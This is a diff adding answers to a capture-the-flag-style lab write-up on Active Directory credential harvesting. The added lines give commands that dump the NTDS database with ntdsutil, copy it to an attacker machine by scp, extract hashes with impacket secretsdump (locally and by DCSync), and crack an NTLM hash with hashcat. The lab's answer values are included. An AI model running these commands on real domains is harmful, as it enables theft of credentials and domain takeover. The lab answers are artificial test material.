@@ -680,7 +680,55 @@ Once we obtained hashes, we can either use the hash for a specific user to imper
 
 * Apply the technique discussed in this task to dump the NTDS file `locally` and extract hashes. What is the target system bootkey value? `Note:` Use thm.red/thm as an Active Directory user since it has administrator privileges!
 
+	`0x36c8d26ec0df8b23ce63bcefa6e2d821`
+
+	* Dumping the content of the NTDS file from the Victim Machine
+		
+		```
+		powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+		```
+
+		![task7-ntdsutil](./images/task7-ntdsutil.png)
+
+	* Check folder `C:\temp`
+	
+		![task7-temp](./images/task7-temp.png)
+
+	* Transfile all file to attacker machine
+	
+		```
+		scp -r C:/temp kakakseram@10.9.251.6:/home/kakakseram/THM/CredentialsHarvesting
+		```
+
+		![task7-scp](./images/task7-scp.png)
+
+	* Extract hashes from NTDS Locally
+	
+		```
+		python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -security ./temp/registry/SECURITY -system ./temp/registry/SYSTEM -ntds ./temp/'Active Directory'/ntds.dit local
+		```
+
+		![task7-bootkey](./images/task7-bootkey.png)
+
 * What is the clear-text password for the `bk-admin` username?
+
+	`Passw0rd123`
+
+	* Performing the DC Sync Attack to Dump NTLM Hashes
+	
+		```
+		python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm THM.red/thm@10.10.1.129
+		```
+
+		![task7-ntlm](./images/task7-ntlm.png)
+
+	* Crack NTLM with hashcat
+	
+		```
+		hashcat -m 1000 -a 0 077cccc23f8ab7031726a3b70c694a49 /usr/share/wordlists/rockyou.txt
+		```
+
+		![task7-hashcat](./images/task7-hashcat.png)
 
 ## Task 8 - Local Administrator Password Solution (LAPS)
 
